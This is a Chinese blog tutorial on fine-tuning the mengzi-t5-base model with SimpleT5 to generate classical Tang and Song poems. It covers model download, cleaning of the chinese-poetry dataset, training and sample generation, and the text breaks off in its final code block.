    <url>/2024/12/08/mengzi-t5%E5%BE%AE%E8%B0%83%E5%8F%A4%E8%AF%97%E7%94%9F%E6%88%90%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="mengzi-t5预训练模型">mengzi-t5预训练模型</h3><p>首先在huggingface下载mengzi-t5-base模型以便后续训练。因为huggingface在国内下载速度较慢，可以使用代理下载，或者直接下载到本地再上传到服务器。这里使用<ahref="https://www.hf-mirror.com">镜像网站</a>下载。<br /><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">!curl -L -O https://hf-mirror.com/Langboat/mengzi-t5-base/resolve/main/pytorch_model.bin?download=True<br>!curl -L -O https://hf-mirror.com/Langboat/mengzi-t5-base/resolve/main/config.json?download=true<br>!curl -L -O https://hf-mirror.com/Langboat/mengzi-t5-base/resolve/main/spiece.vocab?download=true<br>!curl -L -O https://hf-mirror.com/Langboat/mengzi-t5-base/resolve/main/spiece.model?download=true<br></code></pre></td></tr></table></figure></p><h3 id="数据准备">数据准备</h3><h4 id="数据集下载">数据集下载</h4><p>这里的数据是使用<ahref="https://github.com/chinese-poetry/chinese-poetry">chinese-poetry</a>收集的唐诗宋词，由于飞桨平台已经内置该数据集，所以我们只需添加进来就可以了，这里是解压缩数据。<br /><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">!unzip -n ./data/data70759/poems_json.zip<br></code></pre></td></tr></table></figure></p><h4 id="数据处理">数据处理</h4><p>由于数据集中的诗词是繁体，使用chinese-converter库将繁体转换为简体。<br /><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">!pip install chinese-converter<br></code></pre></td></tr></table></figure></p><p>导入库。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-comment"># from tqdm.notebook import tqdm</span><br><span class="hljs-keyword">import</span> chinese_converter  <span class="hljs-comment"># 繁体到简体需要</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># IS_TEST_FLOW = True</span><br>IS_TEST_FLOW = <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure></p><p>使用IS_TEST_FLOW作为测试和训练的标志，如果是测试则只处理少量数据。<br />数据集格式为json，每个json文件有1000首诗，格式如下：<br /><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;author&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;太宗皇帝&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;paragraphs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-string">&quot;秦川雄帝宅，函谷壯皇居。&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-string">&quot;綺殿千尋起，離宮百雉餘。&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-string">&quot;連甍遙接漢，飛觀迥凌虛。&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-string">&quot;雲日隱層闕，風煙出綺疎。&quot;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;note&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;帝京篇十首 一&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure></p><p>处理json文件，创建df_list列表，每个元素是一个dataframe，最后使用pd.concat合并。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">POEM_CONTENT = &#123;<br>    <span class="hljs-string">&#x27;tang&#x27;</span>: &#123;<br>        <span class="hljs-string">&#x27;total&#x27;</span>: <span class="hljs-number">58</span>,<br>        <span class="hljs-string">&#x27;pattern&#x27;</span>: <span class="hljs-string">&quot;./poems_json/poet.tang.&#123;0&#125;.json&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&#x27;song&#x27;</span>: &#123;<br>        <span class="hljs-string">&#x27;total&#x27;</span>: <span class="hljs-number">255</span>,<br>        <span class="hljs-string">&#x27;pattern&#x27;</span>: <span class="hljs-string">&quot;./poems_json/poet.song.&#123;0&#125;.json&quot;</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_poems</span>(<span class="hljs-params">is_test=<span class="hljs-literal">True</span>, verbose=<span class="hljs-literal">True</span></span>):<br>  df_list = []<br>  <span class="hljs-keyword">for</span> dynasty <span class="hljs-keyword">in</span> POEM_CONTENT:<br>    size = <span class="hljs-number">3</span> <span class="hljs-keyword">if</span> is_test <span class="hljs-keyword">else</span> POEM_CONTENT[dynasty][<span class="hljs-string">&#x27;total&#x27;</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):<br>      url = POEM_CONTENT[dynasty][<span class="hljs-string">&#x27;pattern&#x27;</span>].<span class="hljs-built_in">format</span>(i * <span class="hljs-number">1000</span>)<br>      <span class="hljs-keyword">if</span> verbose:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;load <span class="hljs-subst">&#123;url&#125;</span> now&quot;</span>)<br>      df_list.append(pd.read_json(url))<br>  <span class="hljs-keyword">return</span> pd.concat(df_list)<br></code></pre></td></tr></table></figure></p><p>使用df.apply将繁体转换为简体。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">df = get_poems(is_test=IS_TEST_FLOW, verbose=<span class="hljs-literal">True</span>)<br>df[<span class="hljs-string">&#x27;concat_paragraphs&#x27;</span>] = [<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, l)) <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> df[<span class="hljs-string">&#x27;paragraphs&#x27;</span>]]<br>df = df[[<span class="hljs-string">&#x27;author&#x27;</span>, <span class="hljs-string">&#x27;title&#x27;</span>, <span class="hljs-string">&#x27;concat_paragraphs&#x27;</span>]]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_schinese</span>(<span class="hljs-params">tchinese</span>):<br>  <span class="hljs-keyword">return</span> chinese_converter.to_simplified(tchinese)<br><br>df[<span class="hljs-string">&#x27;s_content&#x27;</span>] = df.apply(<span class="hljs-keyword">lambda</span> row: convert_schinese(<span class="hljs-string">&#x27;&#x27;</span>.join(row.concat_paragraphs)), axis=<span class="hljs-number">1</span>)<br>df[<span class="hljs-string">&#x27;s_title&#x27;</span>] = df.apply(<span class="hljs-keyword">lambda</span> row: convert_schinese(<span class="hljs-string">&#x27;&#x27;</span>.join(row.title)), axis=<span class="hljs-number">1</span>)<br>df[<span class="hljs-string">&#x27;s_author&#x27;</span>] = df.apply(<span class="hljs-keyword">lambda</span> row: convert_schinese(<span class="hljs-string">&#x27;&#x27;</span>.join(row.author)), axis=<span class="hljs-number">1</span>)<br><br>my_df = df<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;my_df size&quot;</span>, <span class="hljs-built_in">len</span>(my_df))<br></code></pre></td></tr></table></figure></p><p>创建trim函数，替换掉一些特殊字符，限制作者、标题、内容的长度。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python">MAX_AUTHOR_CHAR = <span class="hljs-number">4</span><br>MAX_TITLE_CHAR = <span class="hljs-number">12</span><br>MIN_CONTENT_CHAR = <span class="hljs-number">20</span><br>MAX_CONTENT_CHAR = <span class="hljs-number">32</span><br>BAD_TOKENS = <span class="hljs-string">&quot; ()[]《》（）□&#123;&#125;abcdefgxyz一&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trim_author_fn</span>(<span class="hljs-params">row</span>):<br>  <span class="hljs-keyword">return</span> row.s_author[:MAX_AUTHOR_CHAR]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trim_title_fn</span>(<span class="hljs-params">row</span>):<br>  trimed_title = row.s_title[:MAX_TITLE_CHAR]<br>  <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> BAD_TOKENS:<br>    trimed_title = trimed_title.replace(b, <span class="hljs-string">&quot;&quot;</span>)<br>  <span class="hljs-keyword">return</span> trimed_title<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trim_content_fn</span>(<span class="hljs-params">row</span>):<br>  trimed_content = row.s_content[:MAX_CONTENT_CHAR]<br>  <span class="hljs-comment"># # End with a period to avoid partial ending to confuse model</span><br>  <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> BAD_TOKENS:<br>    trimed_content = trimed_content.replace(b, <span class="hljs-string">&quot;&quot;</span>)<br>  last_period = trimed_content.rfind(<span class="hljs-string">&quot;。&quot;</span>)<br>  <span class="hljs-keyword">return</span> trimed_content[:last_period+<span class="hljs-number">1</span>]<br>  <span class="hljs-comment"># return trimed_content</span><br><br><span class="hljs-comment"># Trim the size, a soft copy to avoid the view/copy conflict warning</span><br>my_df[<span class="hljs-string">&#x27;s_author_trim&#x27;</span>] = my_df.copy().apply(trim_author_fn, axis=<span class="hljs-number">1</span>)<br>my_df[<span class="hljs-string">&#x27;s_title_trim&#x27;</span>] = my_df.copy().apply(trim_title_fn, axis=<span class="hljs-number">1</span>)<br>my_df[<span class="hljs-string">&#x27;s_content_trim&#x27;</span>] = my_df.copy().apply(trim_content_fn, axis=<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;my_df size&quot;</span>, <span class="hljs-built_in">len</span>(my_df))<br></code></pre></td></tr></table></figure></p><p>过滤掉一些无效数据，比如标题为空、内容太短、无正文等。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Title cannot be empty</span><br>empty_title_mask = (my_df[<span class="hljs-string">&#x27;s_title_trim&#x27;</span>].<span class="hljs-built_in">str</span>.<span class="hljs-built_in">len</span>() == <span class="hljs-number">0</span>)<br>too_short_cotent_mask = (my_df[<span class="hljs-string">&#x27;s_content_trim&#x27;</span>].<span class="hljs-built_in">str</span>.<span class="hljs-built_in">len</span>() &lt;= MIN_CONTENT_CHAR)<br>invalid_mask = ((<span class="hljs-string">&#x27;无正文&#x27;</span> == my_df[<span class="hljs-string">&#x27;s_content_trim&#x27;</span>]) | (<span class="hljs-string">&#x27;无正文&#x27;</span> == my_df[<span class="hljs-string">&#x27;s_author_trim&#x27;</span>]))<br>too_short_mask =  empty_title_mask | too_short_cotent_mask | invalid_mask<br><span class="hljs-comment"># filtered_my_df = my_df.loc[too_short_mask]</span><br><span class="hljs-comment"># filtered_my_df</span><br><br>my_df = my_df.loc[~too_short_mask][[<br>  <span class="hljs-string">&#x27;s_author_trim&#x27;</span>, <span class="hljs-string">&#x27;s_title_trim&#x27;</span>, <span class="hljs-string">&#x27;s_content_trim&#x27;</span>]]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;my_df size&quot;</span>, <span class="hljs-built_in">len</span>(my_df))<br></code></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br>result_dict = &#123;<br>    <span class="hljs-string">&#x27;s_author_trim&#x27;</span>: [],<br>    <span class="hljs-string">&#x27;s_title_trim&#x27;</span>: [],<br>    <span class="hljs-string">&#x27;s_content_trim&#x27;</span>: [],<br>&#125;<br><span class="hljs-keyword">for</span> i, row <span class="hljs-keyword">in</span> my_df.iterrows():<br>  c = row[<span class="hljs-string">&#x27;s_content_trim&#x27;</span>]<br>  snippets = <span class="hljs-built_in">list</span>(re.split(<span class="hljs-string">&#x27;，|。|？&#x27;</span>, c))<br>  lens = [<span class="hljs-built_in">len</span>(s) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> snippets <span class="hljs-keyword">if</span> s.strip() != <span class="hljs-string">&#x27;&#x27;</span>]<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">max</span>(lens) != <span class="hljs-built_in">min</span>(lens) <span class="hljs-keyword">or</span> <span class="hljs-built_in">max</span>(lens) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-number">5</span>, <span class="hljs-number">7</span>]:<br>    <span class="hljs-keyword">continue</span><br>  result_dict[<span class="hljs-string">&#x27;s_author_trim&#x27;</span>].append(row[<span class="hljs-string">&#x27;s_author_trim&#x27;</span>])<br>  result_dict[<span class="hljs-string">&#x27;s_title_trim&#x27;</span>].append(row[<span class="hljs-string">&#x27;s_title_trim&#x27;</span>])<br>  result_dict[<span class="hljs-string">&#x27;s_content_trim&#x27;</span>].append(c)<br><span class="hljs-comment"># print(&quot;get rid of &quot;, sum(bad_items))</span><br>my_df = pd.DataFrame(data=result_dict)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;left&quot;</span>, <span class="hljs-built_in">len</span>(my_df))<br></code></pre></td></tr></table></figure><h4 id="构建数据集">构建数据集</h4><p>构建数据集，包括source_text和target_text。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">AUTHOR_PROMPT = <span class="hljs-string">&quot;模仿：&quot;</span><br>TITLE_PROMPT = <span class="hljs-string">&quot;作诗：&quot;</span><br>EOS_TOKEN = <span class="hljs-string">&#x27;&lt;/s&gt;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_dataset_df</span>(<span class="hljs-params">df, include_author=<span class="hljs-literal">True</span></span>):<br>  dfc = df.copy()<br>  <span class="hljs-keyword">if</span> include_author:<br>    dfc[<span class="hljs-string">&#x27;source_text&#x27;</span>] = TITLE_PROMPT + df[<span class="hljs-string">&#x27;s_title_trim&#x27;</span>] + EOS_TOKEN + AUTHOR_PROMPT + df[<span class="hljs-string">&#x27;s_author_trim&#x27;</span>]<br>  <span class="hljs-keyword">else</span>:<br>    dfc[<span class="hljs-string">&#x27;source_text&#x27;</span>] = TITLE_PROMPT + df[<span class="hljs-string">&#x27;s_title_trim&#x27;</span>]<br>  dfc[<span class="hljs-string">&#x27;target_text&#x27;</span>] = df[<span class="hljs-string">&#x27;s_content_trim&#x27;</span>]<br>  dfc = dfc[[<span class="hljs-string">&#x27;source_text&#x27;</span>, <span class="hljs-string">&#x27;target_text&#x27;</span>]]<br>  <span class="hljs-keyword">return</span> dfc<br></code></pre></td></tr></table></figure></p><p>带有作者的数据集。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">df_author_title_content = build_dataset_df(my_df, <span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure></p><p>不带作者的数据集。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">df_title_content = build_dataset_df(my_df, <span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure></p><p>合并数据集。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">merged_df = pd.concat([df_author_title_content, df_title_content])<br>merged_df = merged_df.sample(frac=<span class="hljs-number">1.</span>)<br></code></pre></td></tr></table></figure> 这里的frac=1.表示打乱数据集。</p><h3 id="训练">训练</h3><p>安装一下torch, simplet5等必要库。<br /><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">!pip install torch<br>!pip install simplet5<br>import torch<br>from simplet5 import SimpleT5<br>from transformers import T5Tokenizer, T5ForConditionalGeneration<br></code></pre></td></tr></table></figure></p><h4 id="定义模型">定义模型</h4><p>定义模型类，继承SimpleT5，加载mengzi-t5-base模型。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.cuda.empty_cache()<br><br><span class="hljs-comment"># 指定本地模型路径</span><br><span class="hljs-comment"># local_model_path = &quot;./mengzi_t5_base&quot;</span><br>local_model_path = <span class="hljs-string">&quot;./MengziT5_base&quot;</span><br><br><span class="hljs-comment"># 定义 extra_ids 数量</span><br>extra_ids = <span class="hljs-number">100</span><br><br><span class="hljs-comment"># 创建包含所有 extra_ids 的特殊标记列表</span><br>additional_special_tokens = [<span class="hljs-string">f&quot;&lt;extra_id_<span class="hljs-subst">&#123;i&#125;</span>&gt;&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(extra_ids)]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MengziSimpleT5</span>(<span class="hljs-title class_ inherited__">SimpleT5</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">super</span>().__init__()<br>    <span class="hljs-variable language_">self</span>.device = torch.device(<span class="hljs-string">&quot;cuda&quot;</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_my_model</span>(<span class="hljs-params">self, use_gpu: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span></span>):<br>    <span class="hljs-comment"># self.tokenizer = T5Tokenizer.from_pretrained(local_model_path,</span><br>    <span class="hljs-comment"># extra_ids=extra_ids,</span><br>    <span class="hljs-comment"># additional_special_tokens=additional_special_tokens)</span><br>    <span class="hljs-variable language_">self</span>.tokenizer = T5Tokenizer.from_pretrained(local_model_path)<br>    <span class="hljs-variable language_">self</span>.model = T5ForConditionalGeneration.from_pretrained(local_model_path)<br><br>model = MengziSimpleT5()<br>model.load_my_model()<br>model.model = model.model.to(<span class="hljs-string">&#x27;cuda&#x27;</span>)<br></code></pre></td></tr></table></figure></p><h4 id="划分数据集">划分数据集</h4><p>将数据集以0.98, 0.02的比例划分为训练集和验证集。 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br>merged_df = merged_df.sample(frac=<span class="hljs-number">1</span>) <span class="hljs-comment"># Shuffle</span><br>train_df, eval_df = train_test_split(merged_df, test_size=<span class="hljs-number">0.02</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;train&quot;</span>, <span class="hljs-built_in">len</span>(train_df), <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-built_in">len</span>(eval_df))<br></code></pre></td></tr></table></figure></p><h4 id="训练模型">训练模型</h4><p>训练模型，使用train_df训练，eval_df验证。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">model.train(train_df=train_df,<br>            eval_df=eval_df,<br>            source_max_token_len=(<span class="hljs-built_in">len</span>(TITLE_PROMPT) + MAX_TITLE_CHAR +  <span class="hljs-number">1</span> + <span class="hljs-built_in">len</span>(AUTHOR_PROMPT) + MAX_AUTHOR_CHAR),<br>            target_max_token_len=MAX_CONTENT_CHAR,<br>            batch_size=<span class="hljs-number">256</span>,<br>            max_epochs=<span class="hljs-number">5</span>,<br>            use_gpu=<span class="hljs-literal">True</span>,<br>            outputdir=<span class="hljs-string">&quot;./Models/t5-poem-v2.1&quot;</span>)<br></code></pre></td></tr></table></figure></p><h4 id="测试模型">测试模型</h4><p>使用模型生成诗词。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">poem</span>(<span class="hljs-params">title_str, opt_author=<span class="hljs-literal">None</span>, model=model,</span><br><span class="hljs-params">         is_input_traditional_chinese=<span class="hljs-literal">False</span>,</span><br><span class="hljs-params">         num_beams=<span class="hljs-number">2</span></span>):<br>  model.model = model.model.to(<span class="hljs-string">&#x27;cuda&#x27;</span>)<br>  <span class="hljs-keyword">if</span> opt_author:<br>    in_request = TITLE_PROMPT + title_str[:MAX_TITLE_CHAR] + EOS_TOKEN + AUTHOR_PROMPT + opt_author[:MAX_AUTHOR_CHAR]<br>  <span class="hljs-keyword">else</span>:<br>    in_request = TITLE_PROMPT + title_str[:MAX_TITLE_CHAR]<br>  <span class="hljs-keyword">if</span> is_input_traditional_chinese:<br>    in_request = chinese_converter.to_simplified(in_request)<br>  out = model.predict(in_request,<br>                      max_length=MAX_CONTENT_CHAR,<br>                      num_beams=num_beams)[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;，&quot;</span>)<br>  <span class="hljs-keyword">if</span> is_input_traditional_chinese:<br>    out = chinese_converter.to_traditional(out)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;標題： <span class="hljs-subst">&#123;in_request.replace(<span class="hljs-string">&#x27;&lt;/s&gt;&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)&#125;</span>\n詩歌： <span class="hljs-subst">&#123;out&#125;</span>&quot;</span>)<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;标题： <span class="hljs-subst">&#123;in_request.replace(<span class="hljs-string">&#x27;&lt;/s&gt;&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)&#125;</span>\n诗歌： <span class="hljs-subst">&#123;out&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>测试模型。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> title <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;秋思&#x27;</span>, <span class="hljs-string">&quot;百花&quot;</span>, <span class="hljs-string">&#x27;佳人有约&#x27;</span>]:<br>  <span class="hljs-comment"># Empty author means general style</span><br>  <span class="hljs-keyword">for</span> author <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&quot;杜甫&quot;</span>, <span class="hljs-string">&quot;李白&quot;</span>, <span class="hljs-string">&quot;李清照&quot;</span>, <span class="hljs-string">&quot;苏轼&quot;</span>]:<br>    poem(title, author)<br>  <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure></p><p>使用不同的num_beams测试模型。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> title <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;冬雪&#x27;</span>]:<br>  <span class="hljs-keyword">for</span> author <span class="hljs-keyword">in</span>  [<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&quot;杜甫&quot;</span>]:<br>    <span class="hljs-keyword">for</span> num_beams <span class="hljs-keyword">in</span> (<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">50</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>):<br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;num beams: <span class="hljs-subst">&#123;num_beams&#125;</span>&quot;</span>)<br>      poem(title, author, num_beams=num_beams)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span>*<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure></p><h3 id="使用模型">使用模型</h3><p>使用模型生成诗词。<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> LogitsProcessor<br><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> LogitsProcessorList<br><br><span class="hljs-comment"># 具体代码</span><br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> simplet5 <span class="hljs-keyword">import</span> SimpleT5<br><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> T5Tokenizer, 